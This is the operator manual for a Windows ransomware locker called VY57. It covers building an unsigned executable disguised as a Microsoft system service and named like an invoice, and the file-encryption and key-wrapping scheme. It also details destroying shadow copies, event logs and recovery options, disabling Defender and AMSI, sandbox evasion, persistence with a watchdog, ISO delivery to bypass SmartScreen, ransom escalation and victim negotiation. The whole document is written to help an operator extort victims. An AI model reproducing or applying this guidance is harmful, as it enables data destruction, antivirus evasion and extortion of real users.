# VY57

A whole-machine file locker for Windows, written as a single Python file, built unsigned with Nuitka, and operated without a C2.

This README is the operator manual. It covers the build, the crypto format, the execution timeline, the evasion layer, the recovery workflow, and the parts that will bite you.

---

## Contents

1. [At a glance](#1-at-a-glance)
2. [What this is and is not](#2-what-this-is-and-is-not)
3. [Repository layout](#3-repository-layout)
4. [Requirements](#4-requirements)
5. [Quick start](#5-quick-start)
6. [Build](#6-build)
7. [First-run key ceremony](#7-first-run-key-ceremony)
8. [Configuration reference](#8-configuration-reference)
9. [Architecture](#9-architecture)
10. [Cryptographic specification](#10-cryptographic-specification)
11. [Key storage and threat model](#11-key-storage-and-threat-model)
12. [Execution timeline](#12-execution-timeline)
13. [Evasion layer](#13-evasion-layer)
14. [Scope rules](#14-scope-rules)
15. [Persistence and the watchdog](#15-persistence-and-the-watchdog)
16. [Victim-facing surfaces](#16-victim-facing-surfaces)
17. [Operator workflow](#17-operator-workflow)
18. [Decryption](#18-decryption)
19. [Troubleshooting](#19-troubleshooting)
20. [Known limitations](#20-known-limitations)
21. [Disaster recovery](#21-disaster-recovery)
22. [Test checklist](#22-test-checklist)
23. [Appendix A: reference decryptor](#appendix-a-reference-decryptor)
24. [Appendix B: changelog](#appendix-b-changelog)

---

## 1. At a glance

| Property | Value |
| --- | --- |
| Target | Windows 10 / 11, x64 |
| Language | Python 3.11+, compiled by Nuitka to a single exe |
| Signing | None |
| Cipher | AES-256-CBC, per-file keys, encrypt-then-MAC |
| Key wrapping | RSA-2048-OAEP-SHA256 (operator) + DPAPI (local) |
| Encryption mode | Intermittent by default (1 MiB head + 1 MiB tail) |
| Per-file cap | 2048 MiB |
| Ransom | $50 USD, escalates to $100 at 36 h and $200 at 72 h |
| Extension | `.<victim-id>.v57`, victim id is 6 hex chars |
| Persistence | HKCU Run key + Startup shortcut + detached watchdog |
| Unlocker | PowerShell, generated per victim with the master baked in |
| Default version string | `2.1.1` |

---

## 2. What this is and is not

**Is:** a self-contained locker with a real asymmetric key hierarchy, shadow-copy destruction, a watchdog, and a decryptor that survives being shipped over email. It runs unattended, survives reboot, and re-arms on login until the victim pays.

**Is not:** a C2-backed operation. There is no beacon, no per-victim key server, no live price enforcement, and no telemetry. Everything the operator learns comes from the victim contacting them.

The single most important consequence: **the master key is recoverable from the victim machine** (see [§11](#11-key-storage-and-threat-model)). A technically competent victim can decrypt for free in about ten minutes of work. The design optimises for a non-technical victim and for operator convenience, not for cryptographic hardness against a reverse engineer.

---

## 3. Repository layout

Source tree:

```
vy57.py              the entire locker
app.ico              build asset, icon
wall.bmp             build asset, optional wallpaper
```

Generated on the build host, never shipped to victims:

```
vy57_priv.pem        RSA private key. THE single point of failure.
unlock.ps1           per-victim decryptor
unlock.bat           wrapper that launches unlock.ps1
```

Generated on the victim machine at runtime:

```
%APPDATA%\VY57\key.dat              obfuscated key store
%LOCALAPPDATA%\VY57\key.dat         second copy
%LOCALAPPDATA%\VY57\vy57_debug.log  run log
%APPDATA%\VY57\.vy57_done           watchdog completion gate
%APPDATA%\VY57\.vy57_restarts       watchdog restart budget
%LOCALAPPDATA%\Microsoft\Windows\Notifications\WinSysCache.exe   persisted copy
%APPDATA%\...\Startup\WinSysCache.lnk
HKCU\Software\Classes\CLSID\{9A3F2C71-...}\InprocServer32        key store
HKCU\Software\Microsoft\Windows\CurrentVersion\Run               persistence
```

Ransom notes are dropped as `!!!_READ_ME_!!!.txt` and `!!!_READ_ME_!!!.html` in the user's desktop(s), Documents, Downloads, Pictures, Music, Videos, Public, and the root of every encrypted volume.

---

## 4. Requirements

**Build host**

- Windows x64 (MinGW64 target, no MSVC needed)
- Python 3.11 or 3.12
- `pycryptodome` (`pip install pycryptodome`)
- Nuitka (`pip install nuitka`)
- ~2 GB free disk for the build cache

**Victim host**

- Windows 10 or 11, x64
- No Python runtime required
- Administrator rights strongly preferred; without them roughly half the evasion layer silently no-ops (see [§13](#13-evasion-layer))

**Delivery**

- ISO container is preferred. It strips Mark-of-the-Web, which suppresses the SmartScreen "unknown publisher" prompt entirely.
- Zip delivery works but leaves MOTW. The exe strips its own zone identifier on launch, which helps only *after* the first execution.
- A plausible filename matters more than the icon. `Invoice_Nov.exe` is the default output name.

---

## 5. Quick start

```bat
pip install nuitka pycryptodome

python vy57.py --gen-keys
:: paste the PUB_B64 output into vy57.py
:: move vy57_priv.pem somewhere that is not the victim machine

python vy57.py --gen-lits
:: paste the literal table over the literals block

python vy57.py --gen-ps
:: paste PS_XOR and PS_BLOB

python vy57.py --gen-key
:: paste KEY_XOR

python -m nuitka --standalone --onefile --mingw64 ^
  --enable-plugin=tk-inter --windows-console-mode=disable ^
  --windows-uac-admin --windows-icon-from-ico=app.ico ^
  --windows-company-name="Microsoft Corporation" ^
  --windows-product-name="Windows System Cache" ^
  --windows-file-description="Windows System Cache Service" ^
  --windows-file-version=10.0.19041.1 ^
  --include-data-file=wall.bmp=wall.bmp ^
  --onefile-tempdir-spec="{CACHE_DIR}/D3DSCache" ^
  --python-flag=no_site,no_asserts,no_docstrings ^
  --nofollow-import-to=unittest,email,http,xml,pydoc,doctest,distutils,setuptools,pip ^
  --include-package=Crypto --assume-yes-for-downloads ^
  --lto=yes --output-filename=Invoice_Nov.exe vy57.py
```

Then on a clean VM:

```bat
Invoice_Nov.exe --list
Invoice_Nov.exe --scope user --workers 2 --no-persist
```

---

## 6. Build

### Why Nuitka and not PyInstaller

PyInstaller bootloaders are heavily signaturised and its onefile mode leaves an obvious `_MEIxxxxx` directory plus a `pyi-*` manifest. Nuitka compiles the Python to C first, so there is no embedded interpreter blob and no `pythonXY.dll` in the payload. It is not invisible, but it is a smaller target.

### Flag notes

| Flag | Why |
| --- | --- |
| `--onefile` | single artifact, easy to deliver |
| `--mingw64` | no MSVC dependency on the build host |
| `--windows-console-mode=disable` | no console window on launch |
| `--windows-uac-admin` | manifest requests elevation |
| `--onefile-tempdir-spec="{CACHE_DIR}/D3DSCache"` | extraction lands in a real Windows folder name instead of `onefile_XXXX` |
| `--python-flag=no_docstrings` | strips the module docstring, which otherwise ships verbatim in the binary |
| `--python-flag=no_site,no_asserts` | smaller payload, fewer import strings |
| `--nofollow-import-to=...` | prunes unused stdlib that would otherwise add recognisable module names |
| `--include-package=Crypto` | pycryptodome is imported dynamically enough that Nuitka needs to be told |
| `--windows-company-name` etc. | populates the version resource; an unsigned exe with no metadata at all is more conspicuous than one with plausible metadata |
| `--lto=yes` | slower build, smaller and slightly less pattern-matchable binary |

### Things that will break the build

- Missing `wall.bmp` while `--include-data-file=wall.bmp=wall.bmp` is present. Either create the file or drop the flag; the code falls back to a generated solid-colour BMP at runtime if the asset is absent.
- `--enable-plugin=tk-inter` omitted. Tk will not be bundled and the GUI will fail at import.
- Building on 32-bit Python. The victim-side `ctypes` calls assume 64-bit pointer widths in several places.

### Post-build

Verify the version resource landed:

```bat
powershell -c "(Get-Item .\Invoice_Nov.exe).VersionInfo | fl CompanyName,FileDescription,FileVersion"
```

Confirm no console flash and that `--list` produces per-root counts on a throwaway VM before doing anything else.

---

## 7. First-run key ceremony

Run these once, in order, on the build host.

### 7.1 `--gen-keys`

Generates a 2048-bit RSA keypair. Writes `vy57_priv.pem` to the working directory and prints a base64 DER public key.

**Paste the public key into `PUB_B64`.** If you leave `PUB_B64` empty the build still works but falls back to storing the master as plain base64-XOR, and the asymmetric layer is gone.

Move `vy57_priv.pem` off the build host. Keep two copies in two places. If you lose it, every victim you have not already built an unlocker for becomes unrecoverable remotely (see [§21](#21-disaster-recovery)).

### 7.2 `--gen-lits`

Prints a fresh hex-encoded literal table. Paste it over the block between the `# literals` comment and the `# [UD] per-build XOR constants` comment.

This is cosmetic-but-real: the BTC address, CLSID, both Defender policy paths, the Run key path, and the note filenames are all plainly greppable in an uncompiled binary. Regenerate per campaign so a signature for one build does not match the next.

### 7.3 `--gen-ps` and `--gen-key`

Same idea for the embedded PowerShell blob and the store XOR constant. Both are `[UD]` (unique data) values that should differ per build.

Order matters: `--gen-ps` prints a new `PS_XOR`, so run it before `--gen-key` or you will paste a stale constant.

### 7.4 Build and verify

Build, then run `--list` on a VM. Confirm the log reports `pub=True`. If it says `pub=False`, your `PUB_B64` paste did not take.

---

## 8. Configuration reference

### 8.1 Flags

| Flag | Default | Effect |
| --- | --- | --- |
| `--list` | off | dry run, counts entries per root, no writes |
| `--scope user` | `all` | limit to the profile and Public |
| `--decrypt` | off | restore mode |
| `--key K` | – | explicit master for `--decrypt` / `--make-unlocker` |
| `--priv P` | `vy57_priv.pem` | private key for unwrapping |
| `--make-unlocker` | off | build `unlock.ps1` / `unlock.bat` |
| `--gen-keys` / `--gen-lits` / `--gen-ps` / `--gen-key` | off | build-time generators |
| `--sandbox M` | `auto` | `auto`, `sleep`, `exit`, `run` |
| `--amsi` | off | AMSI patch before PowerShell |
| `--self-delete` | off | remove the original exe after self-copy |
| `--no-timestomp` | off | keep the original mtime on the copy |
| `--no-logs` | off | keep event logs |
| `--no-ps` | off | registry-only Defender tampering |
| `--no-evade` | off | skip jitter, sandbox, Defender, hardening, kill |
| `--no-delay` | off | skip jitter and worker ramp |
| `--no-persist` | off | skip persistence and watchdog |
| `--no-harden` | off | skip shadows/USN/bcdedit/hiberfil/kill |
| `--no-kill` | off | keep Office and Acrobat running |
| `--no-open` | off | do not auto-open the note |
| `--no-elevate` | off | never prompt for UAC |
| `--quiet` | off | persistence entry point, no GUI unless work is pending |
| `--full` | off | disable intermittent mode |
| `--workers N` | 6 | encryption threads, clamped 1–32 |
| `--max-size N` | 2048 | per-file cap in MB, 0 = unlimited |
| `--watch PID` | – | internal, watchdog entry |
| `--origin PATH` | – | internal, watchdog relaunch target |
| `--elevated` | – | internal, set on the elevated relaunch |

### 8.2 Constants worth tuning

| Constant | Default | Notes |
| --- | --- | --- |
| `BASE_PRICE` | 50 | USD |
| `DEADLINE_HOURS` | 72 | drives escalation display only |
| `HEAD_LEN` / `TAIL_LEN` | 1 MiB | larger = slower, less plaintext exposed |
| `FULL_LIMIT` | 4 MiB | files at or below this are fully encrypted |
| `MAX_SIZE` | 2048 MiB | raise with `--max-size 0` at your own risk |
| `WORKERS` | 6 | above ~8 you saturate I/O, not CPU |
| `RAMP_FILES` | 40 | slow start before widening |
| `RETRY_PASSES` | 3 | held-file retries |
| `SKIP_DIR_NAMES` / `SKIP_DIR_FRAGMENTS` | see source | scope control, [§14](#14-scope-rules) |
| `SB_USERS` / `SB_HOSTS_*` / `SB_PATHS` | see source | sandbox scoring inputs |

---

## 9. Architecture

Single module, no packages. Sections in file order:

```
literals          hex-encoded strings, decoded at import
logging           stdout + %LOCALAPPDATA%\VY57\vy57_debug.log
paths             base resolution, original_exe(), note target enumeration
dpapi             CryptProtectData / CryptUnprotectData wrappers
environment       admin check, mutex, VM detection, lock probe, elevation
sandbox           weighted scoring, verdict
powershell        encoded invocation, AMSI patch, policy writes, exclusions
persistence       IShellLink shortcut, timestomp, hide, self-copy
wallpaper         capture, replace, BMP synthesis
crypto            padding, KDF, wrap/unwrap
key store         registry + two files, DPAPI-backed master_of()
scope             root discovery, directory skip rules
listing           plaintext and encrypted enumeration
per-file          encrypt_file / decrypt_file
batch             ThreadPoolExecutor driver with ramp and retry
notes             text and HTML generation, drop, remove
unlocker          PS1/BAT template and builder
generators        gen_keys / gen_lits / gen_ps / gen_key
GUI               fullscreen Tk
main              phase orchestration
```

### Threading model

- Main thread: setup, then blocks in the Tk mainloop (interactive) or runs encryption inline (quiet).
- Worker thread: `encrypt_all` over the shuffled file list.
- Watcher thread: polls for new drive letters every 30 s, encrypts any that appear.
- Watchdog process: detached, waits on the parent handle, relaunches if the parent dies before the done-marker exists.

Shared mutable state is `DONE_COUNTER` (counter lock), the queued-file check (queue lock), and the roots list (roots lock). `encrypt_file` re-checks the magic header under the queue lock so the watcher cannot double-encrypt a file the main pass already finished.

### Control flow

`main()` is a linear phase list with early returns for the generator subcommands, `--list`, and `--decrypt`. The infection path is: sandbox verdict → elevation → scope → key load or create → queue → jitter → Defender → hardening → process kill → persistence → wallpaper → notes → encrypt → GUI.

---

## 10. Cryptographic specification

This is a formal description. [Appendix A](#appendix-a-reference-decryptor) has a working implementation.

### 10.1 Primitives

- AES-256 in CBC mode, PKCS#7 padding
- HMAC-SHA256, truncated to 16 bytes
- RSA-2048 with OAEP and SHA-256
- 32-byte master, from `secrets.token_bytes`
- 16-byte IV per file, from `secrets.token_bytes`

### 10.2 Per-file key schedule

```
fk      = HMAC-SHA256(master, 0x6B || iv)          AES key
tk      = HMAC-SHA256(master, 0x74 || iv)          tag key
iv_tail = HMAC-SHA256(master, 0x54 || iv)[0:16]    tail IV
```

`0x54` is ASCII `T`. `iv_tail` is derived rather than stored, so the header carries one IV.

### 10.3 File layout

```
offset  size  field
0       8     magic, 89 56 59 37 0D 0A 1A 0A
8       1     format version, 0x02
9       1     flags, bit 0 = intermittent
10      16    iv
26      4     ct_head_len, uint32 LE, multiple of 16
30      4     ct_tail_len, uint32 LE, multiple of 16, 0 in full mode
34      n     ct_head
34+n    m     plaintext middle, untouched, 0 in full mode
..      k     ct_tail
EOF-16  16    HMAC-SHA256(tk, header || ct_head || ct_tail)[0:16]
```

`HDR_LEN = 34`, `MIN_BLOB = 66`.

### 10.4 Encryption

Full mode (size ≤ 4 MiB, or `--full`):

1. Read the whole file.
2. `ct_head = AES-CBC(fk, iv, pad(plaintext))`.
3. `ct_tail = empty`.
4. Write header with `ct_tail_len = 0`.

Intermittent mode (size > 4 MiB):

1. Read the first 1 MiB, `ct_head = AES-CBC(fk, iv, pad(head))`.
2. Seek to `size - 1 MiB`, read, `ct_tail = AES-CBC(fk, iv_tail, pad(tail))`.
3. Write header, `ct_head`, stream the middle verbatim, `ct_tail`.

Both modes then append the truncated tag, `fsync`, and rename into place.

### 10.5 Decryption

1. Read and validate the header. Reject bad magic, bad version, non-multiple-of-16 lengths, or negative middle length.
2. Read `ct_head`; if `ct_tail_len` is non-zero, seek to `EOF-16-ct_tail_len` and read `ct_tail`.
3. Recompute the tag over `header || ct_head || ct_tail` and compare in constant time. Abort on mismatch.
4. Write `unpad(AES-CBC-decrypt(ct_head))`, then the middle verbatim, then `unpad(AES-CBC-decrypt(ct_tail))`.
5. `fsync`, rename, restore mtime.

### 10.6 Properties and gaps

- The tag authenticates the header and both ciphertext regions. In intermittent mode **the middle is not authenticated** — silent corruption there is undetectable and will still produce a "successful" decrypt.
- Because keys are derived from the master and the IV, a single master restores everything and files stay rename-safe.
- CBC with PKCS#7 means a truncated file fails padding but the tag catches it first.
- Intermittent mode leaves the middle readable. Roughly 2 MiB plus the tag of every large file is destroyed; everything between is intact. A victim can often recover the middle of a video or archive with `dd` and a hex editor.
- Empty files still produce one padding block plus tag, so they are distinguishable from originals.

---

## 11. Key storage and threat model

The master is held in three places:

| Location | Form | Recoverable by |
| --- | --- | --- |
| `key.dat` (×2) + registry | JSON, XOR'd with `KEY_XOR`, base64'd, containing `w` (RSA-OAEP ciphertext) and `d` (DPAPI blob) | operator via `w`; victim via `d` |
| `PUB_B64` in the binary | public key only | nobody, useless alone |
| `vy57_priv.pem` | operator side | operator only |

`master_of()` resolves in order: DPAPI, then plaintext fallback (`P:` prefix, dev builds only), then private key.

### What this buys

- The victim cannot read the master by eyeballing `key.dat`. It is RSA ciphertext plus a DPAPI blob.
- Re-runs, GUI validation, and local `--decrypt` all work without the private key.
- The operator can build an unlocker from `w` and `vy57_priv.pem` alone, on any machine.

### What it costs

**DPAPI is the hole.** The `d` blob is protected to the current user on the current machine. The victim *is* that user on that machine. A ten-line PowerShell script calling `CryptUnprotectData` yields the master, and with it full decryption, for free.

```
$b = [IO.File]::ReadAllBytes("$env:APPDATA\VY57\key.dat")
$j = [Text.Encoding]::UTF8.GetString([byte[]]($b | % { $_ -bxor 0x37 }))
# base64-decode, JSON-parse, base64-decode .d, CryptUnprotectData, done
```

Mitigations available if this matters:

- Strip `d` from the store after the run and accept that re-runs need the private key.
- Wrap `d` with an extra passphrase the victim must obtain from you (not implemented).
- Stand up a C2 and delete `d` entirely (not implemented).

### Threat model summary

| Adversary | Outcome |
| --- | --- |
| Non-technical user | pays, or loses data |
| User who googles the extension | finds the note, still needs a key, pays |
| User who reads `key.dat` and knows DPAPI | free decryption |
| Analyst with a debugger | free decryption, plus the whole evasion layer documented |
| Anyone with `vy57_priv.pem` | free decryption of everything |

---

## 12. Execution timeline

Interactive run, default flags, admin granted:

| t | Phase |
| --- | --- |
| 0 | stdout and log initialised, banner written |
| +0 s | zone identifier stripped from the exe and the original |
| +0 s | sandbox scored; abort, sleep 3–7 min, or continue |
| +0–5 min | UAC prompt, elevated relaunch, original process exits |
| +0 s | scope enumerated from drive letters |
| +0 s | key store read; master reused, or new master generated and stored |
| +0–60 s | file queue built (single-threaded walk, size and magic filtered) |
| +0 s | jitter, 8–18 s normally, 20–40 s in a VM |
| +1 s | third-party AV enumerated and logged |
| +1 s | Defender policy written, exclusions added, PowerShell policy set |
| +2 s | AMSI patch if `--amsi`, then `Set-MpPreference` |
| +5 s | shadow copies, backup catalog, event logs deleted |
| +10 s | USN journal deleted per fixed volume |
| +12 s | `bcdedit` recovery off, `powercfg /h off` |
| +15 s | `taskkill` on Office, Acrobat, Notepad, Paint |
| +17 s | self-copy, timestomp, hide, Run key, Startup shortcut, optional self-delete |
| +20 s | wallpaper replaced |
| +21 s | notes dropped across all targets, HTML opened, beep |
| +21 s | watcher thread and watchdog spawned |
| +22 s | encryption begins, 2 workers for the first 40 files, then 6 |
| +22 s onward | fullscreen GUI with live counter |
| end | done-marker written; process waits on the GUI |

Quiet run (persistence entry): sandbox skipped, no watchdog, encryption inline, GUI only if files were pending.

`--decrypt`: sandbox → elevation → master → full decrypt → notes removed → wallpaper restored → persistence removed.

---

## 13. Evasion layer

Each technique, and what it actually does.

| Technique | Beats | Does not beat |
| --- | --- | --- |
| Sandbox scoring, abort on ≥ 6 | automated sandboxes with fresh uptime and no browser profile | a sandbox with a warmed profile |
| Sandbox scoring, sleep 3–7 min on ≥ 3 | timeout-limited analysis | patient analysts |
| Jitter before encryption | fast heuristic triggers | nothing much |
| Defender policy registry writes | real-time scanning on builds without Tamper Protection | Tamper Protection, which reverts `DisableRealtimeMonitoring` |
| Path exclusions via HKLM | file scanning of our own directories | anything outside those paths |
| `Set-MpPreference` via PowerShell | controlled folder access | AMSI inspection of the script itself |
| AMSI patch (`--amsi`) | scanning of the *second* PowerShell invocation | scanning of the first, which contains the patch |
| `-EncodedCommand` | script text in command lines, WMI command-line consumers | anyone who base64-decodes it |
| `--no-ps` | the whole PowerShell surface | nothing, it just does less |
| Hex-encoded literals | `strings` greps for the address, CLSID, policy paths | anyone reading the source |
| `no_docstrings` build flag | the usage block shipping in the binary | – |
| Version resource spoofing | metadata-based "unknown publisher with no info" heuristics | signature checks |
| `D3DSCache` tempdir | `onefile_XXXX` extraction signatures | Nuitka bootloader detection |
| Timestomp to `kernel32.dll` | "created seconds ago" heuristics | content hashes |
| Hidden + System attributes | casual discovery | `dir /a` |
| `--self-delete` | the obvious "run it again" artifact | – |
| ISO delivery | SmartScreen entirely | – |

**The hard truth:** none of this survives a signature written against the build. What it buys is the window between release and detection. Regenerate the `[UD]` constants per campaign and rebuild; a stale build is detected within hours.

**Defender specifically:** on a machine with Tamper Protection enabled, `DisableAntiSpyware` is ignored outright on 1903+, and real-time monitoring is often re-enabled at the next policy refresh. The *exclusions* are the part that reliably holds long enough for encryption to finish. Everything else is minutes.

---

## 14. Scope rules

### What is encrypted

Every drive letter that answers `os.path.isdir`, all the way down, minus the skip lists.

### Hard skips

`Windows`, `Windows.old`, `Program Files`, `Program Files (x86)`, `System Volume Information`, `Recovery`, `PerfLogs`, `$WinREAgent`, `Config.Msi`, `Packages`, `D3DSCache`.

Skipping `Windows` is what keeps the machine bootable. Skipping `Program Files` keeps installed applications launching. Skipping `Packages` keeps UWP apps alive.

### Soft skips

`node_modules`, `venv`, `.venv`, `.git`, `__pycache__`, `site-packages`, `.gradle`, `.cache`, `Temp`, `tmp`, `OneDriveTemp` — high file count, low victim value.

### Fragments

`\AppData\Local\Programs` (installed apps), `\AppData\Local\Microsoft\Windows\Themes\CachedFiles` (theme state), `\...\Notifications` (our own persistence dir), `\ProgramData\Microsoft\Windows Defender`, `\ProgramData\Package Cache` (installer cache), `\_MEI`, `\VY57`, `\D3DSCache`.

### Deliberately included

`ProgramData`, `$Recycle.Bin`, `AppData\Local\Microsoft` — user data, game saves, container state, browser profiles.

### Per-file filters

Extension in `SKIP_EXTENSIONS`, name in `SKIP_NAMES`, symlinks, size over `MAX_SIZE`, files already carrying the magic header, files whose `.v57` sibling exists.

### Making it scarier

Drop `Windows` from the skip list and you break boot on most machines. Drop `Program Files` and every application stops launching — high impact, but recovery gets ugly because the unlocker has to traverse it. Drop the `OneDriveTemp` and `Temp` skips for volume.

### Making it safer

Add `ProgramData` and `AppData\Local\Microsoft` to the skip list. You lose game saves and browser sessions, keep everything else.

---

## 15. Persistence and the watchdog

### Persistence

Two independent HKCU mechanisms, both user-scoped so no admin is needed:

1. `Run` value `WinSysCache` pointing at the persisted copy with `--quiet`
2. `Startup\WinSysCache.lnk` created through `IShellLink` without pywin32

The copy lands in `%LOCALAPPDATA%\Microsoft\Windows\Notifications\WinSysCache.exe` — a real Windows folder, not a fake one — with its zone identifier stripped, its timestamps set to `kernel32.dll`'s, and Hidden + System attributes applied.

Both mechanisms run at login. The first quiet invocation after reboot re-queues anything new and shows the GUI if it finds work.

### Watchdog

Spawned detached with `--watch <pid> --origin <path>`. It waits on the parent process handle. If the parent dies before `.vy57_done` exists, it waits 2 s and relaunches the *original* exe with `--quiet`.

Restarts are capped at three via `.vy57_restarts`. The cap exists so a build that crashes on startup does not fork-bomb the machine.

The `--origin` argument exists because the onefile temp copy disappears when the parent exits. Relaunching the temp path would fail.

### Teardown

`remove_persistence()` deletes the Run value, the shortcut, the persisted copy, and both state files. It runs on successful GUI unlock and on `--decrypt`.

---

## 16. Victim-facing surfaces

### GUI

Fullscreen, topmost, black and red. Shows the victim ID, the BTC address, the live lock counter, an elapsed timer, and a countdown with the current multiplier. A wrong key triggers an icon-hand beep and a red `WRONG KEY !!!`.

Closing the window attempts the key. A correct key tears the window down after 200 ms and starts decryption.

### Notes

`!!!_READ_ME_!!!.txt` and `!!!_READ_ME_!!!.html`, identical content: victim ID, file count, current price, deadline timestamp, payment address, the three-step recovery procedure, and the prohibitions (do not delete, do not run `chkdsk`, do not reinstall).

The HTML is auto-opened via the default browser unless `--no-open`.

### Wallpaper

Replaced with `wall.bmp` from the build directory, or a generated solid near-black BMP with blue edges if the asset is missing. The original path is captured into the key store *before* replacement and restored on decrypt.

### Price escalation

Computed from the install timestamp: `$50` for the first 36 h, `$100` to 72 h, `$200` after. Purely cosmetic — nothing enforces it, and the note text is regenerated only when notes are re-dropped, so a victim reading a stale note sees a stale price. Accept whatever they offer.

---

## 17. Operator workflow

### 17.1 Triage

The victim contacts you with a victim ID from the note. The ID is 6 hex chars and is also the middle segment of the file extension, so a screenshot of any file confirms it.

Establish:

- Victim ID (must match)
- Machine name
- Whether the GUI is still on screen or the machine rebooted
- Whether they ran `chkdsk`, restored a backup, or reinstalled anything

If they reinstalled over the top, the DPAPI blob is gone and only `--priv` works.

### 17.2 Negotiation

Quote the price from the note. Do not discount below `$50`. Accept overpayment.

### 17.3 Build the unlocker

On the build host, with the key store in place and `vy57_priv.pem` available:

```bat
Invoice_Nov.exe --make-unlocker --priv vy57_priv.pem
```

This reads the store, unwraps the master, and writes `unlock.ps1` and `unlock.bat` into the working directory. It prints the plaintext master and the roots to the console — keep that output, it is your only backup if the victim's `d` blob is gone.

`--key K` works instead of `--priv` if you already have the master.

### 17.4 Deliver

Send **both** files. Tell the victim to save them to the same folder, for example `Downloads`, and double-click `unlock.bat`.

They will need `-ExecutionPolicy Bypass` to be reachable, which the BAT supplies. If their policy blocks it anyway, the fallback is the CLI route in [§18.3](#183-cli).

### 17.5 Verify

Ask for a screenshot of the `Restored: N    Failed: M` summary. `Failed` above zero means files that were locked during encryption, corrupted, or larger than the cap. Walk them through re-running for the failures.

### 17.6 Close

Have them run:

```bat
Invoice_Nov.exe --decrypt --key <master>
```

That removes the notes and restores the wallpaper, which the unlocker does not do.

---

## 18. Decryption

Three routes, in descending order of convenience.

### 18.1 GUI unlock

Type the master into the running GUI. On accept the process decrypts, removes notes, restores the wallpaper, and removes persistence. Only available while the process is alive and the GUI is on screen.

### 18.2 unlock.bat

The shipped route. `unlock.ps1` walks the stored roots, validates each file's magic, version, and tag, and decrypts on match. It tries every master in its array, so an unlocker built against a newer master still opens older files.

`Restored` / `Failed` counters are printed at the end.

Requires: PowerShell 5.1 (present by default), both files in the same directory, and no execution-policy block on local scripts.

### 18.3 CLI

On the victim machine, with the original exe or any copy:

```bat
Invoice_Nov.exe --decrypt --key <master>
Invoice_Nov.exe --decrypt --priv vy57_priv.pem
Invoice_Nov.exe --decrypt                     :: uses the DPAPI blob
```

`--decrypt` also removes notes, restores the wallpaper, and tears down persistence.

### 18.4 Manual

[Appendix A](#appendix-a-reference-decryptor). Useful when the victim has no exe left and PowerShell is restricted.

---

## 19. Troubleshooting

| Symptom | Cause | Fix |
| --- | --- | --- |
| `0 file(s) queued` on a machine that clearly has files | everything already encrypted, or wrong scope, or `MAX_SIZE` | check `--list` output; confirm `--scope all` |
| `quiet: nothing to do` on every login | nothing new, working as intended | – |
| GUI never appears after reboot | Run key or Startup shortcut removed | re-run the exe manually |
| `no stored key - pass --key or --priv` | store wiped, registry cleaned, or profile recreated | use `--priv` or `--key` |
| `cannot obtain master: [Errno 2] vy57_priv.pem` | DPAPI blob gone and no key supplied | supply `--priv` or `--key` |
| `cannot obtain master: CryptUnprotectData` | different user profile, or DPAPI state reset | supply `--priv` or `--key` |
| `dpapi protect failed` in the log | restricted profile | build still works, re-runs need `--priv` |
| `no matching key` from `unlock.ps1` | wrong unlocker for that victim | rebuild against the correct store |
| `tag mismatch` on many files | same as above, or files edited post-encryption | rebuild; edited files are unrecoverable |
| Defender still quarantines the exe | exclusions failed (not admin), or Tamper Protection | deliver as ISO, re-run elevated |
| `UAC declined` then half the hardening skipped | user clicked No | re-run, click Yes |
| Wallpaper not restored | original path gone | set it manually |
| Files end in `.v57.v57` | v2.0 and earlier watcher race | decrypt twice, oldest extension first |
| `powershell failed` in the log | policy or AMSI blocking | retry with `--no-ps`, exclusions still apply |
| Build fails at `--include-data-file` | `wall.bmp` missing | create the file or drop the flag |
| GUI opens but encryption is stuck at 0 | permissions on the profile root | check `--scope user` works |

---

## 20. Known limitations

Ordered roughly by how much they should worry you.

1. **DPAPI makes local recovery free.** [§11](#11-key-storage-and-threat-model).
2. **No C2.** No live pricing, no beacon, no per-victim key server, no telemetry.
3. **The price escalation is fake.** Nothing enforces it.
4. **Intermittent mode leaves plaintext middles.** Large media and archives are partly recoverable.
5. **The middle is unauthenticated.** Silent corruption there decrypts "successfully".
6. **Windows and Program Files are untouched.** The machine still boots and most apps still launch, which makes the infection look less total than it is.
7. **No VSS on non-admin runs.** If UAC is declined, shadow copies survive and the whole job is undone by a single `vssadmin` restore.
8. **Nuitka onefile is itself a heuristic.** The extraction step is detectable.
9. **Tamper Protection reverts Defender changes.** Exclusions usually survive; real-time state does not.
10. **No file-content classification.** It encrypts `.iso`, `.vmdk`, and `.bak` with the same enthusiasm as documents.
11. **OneDrive placeholder hydration.** Cloud-only files get pulled down on open, which can stall the walk on large accounts.
12. **No network shares.** Mapped letters are covered because they answer `isdir`; UNC paths are not enumerated.
13. **Tk fullscreen clips on displays under 1100×700.**
14. **The unlocker holds whole files in memory.** A 2 GB file needs 2 GB of RAM on the victim machine.
15. **`--self-delete` is best-effort.** It can fail if the exe is still mapped elsewhere.

---

## 21. Disaster recovery

### Lost `vy57_priv.pem`

Every victim whose machine still has a valid DPAPI blob is still recoverable — run `--decrypt` **on the victim machine** and it resolves through DPAPI with no key. Victims whose profile was recreated are gone.

Generate a new keypair and rebuild for future campaigns. Do not reuse the old `PUB_B64` if you no longer hold the private half.

### Lost the key store but have the private key

Nothing to do. The store holds the RSA ciphertext; without it the private key cannot help. The only remaining route is a victim-side `--decrypt` via DPAPI.

### Victim reinstalled Windows over the top

DPAPI is gone. If you have `--priv` and a store copy, you can still build an unlocker — the files are intact, only the local key path is broken.

### Victim ran `chkdsk`

Usually harmless. If they ran it with `/f` on an NTFS volume mid-encryption, some files will have truncated tails and will fail the tag check. Those are unrecoverable.

### Victim restored from a backup

The backup contains plaintext. Anything created after the backup is encrypted. No action needed; both can coexist because encrypted files carry the magic header.

---

## 22. Test checklist

Run on a disposable VM before every campaign.

- [ ] `--list` returns plausible per-root counts
- [ ] `--gen-keys` produces a key and prints a public key
- [ ] `PUB_B64` pasted; log shows `pub=True`
- [ ] `--gen-lits`, `--gen-ps`, `--gen-key` all applied and the file still imports
- [ ] Build completes with no warnings about missing assets
- [ ] Version resource present in the built exe
- [ ] `--scope user --workers 2 --no-persist` completes on a seeded profile
- [ ] A 6 MiB file is intermittent; check the middle is intact with a hex editor
- [ ] `--full` produces a fully encrypted file
- [ ] `--make-unlocker --priv` builds both files
- [ ] `unlock.bat` restores everything, including the 6 MiB file
- [ ] `--decrypt --key` restores and cleans notes and wallpaper
- [ ] Decrypt with the *wrong* key fails cleanly and does not destroy files
- [ ] `--sandbox exit` exits before any writes
- [ ] `--sandbox sleep` delays visibly
- [ ] Persistence survives a reboot and does not loop
- [ ] Killing the process mid-run triggers exactly one watchdog restart
- [ ] After completion, killing the process triggers no restart
- [ ] Defender exclusions present in `HKLM\...\Exclusions\Paths`
- [ ] `--self-delete` removes the original and the persisted copy still runs
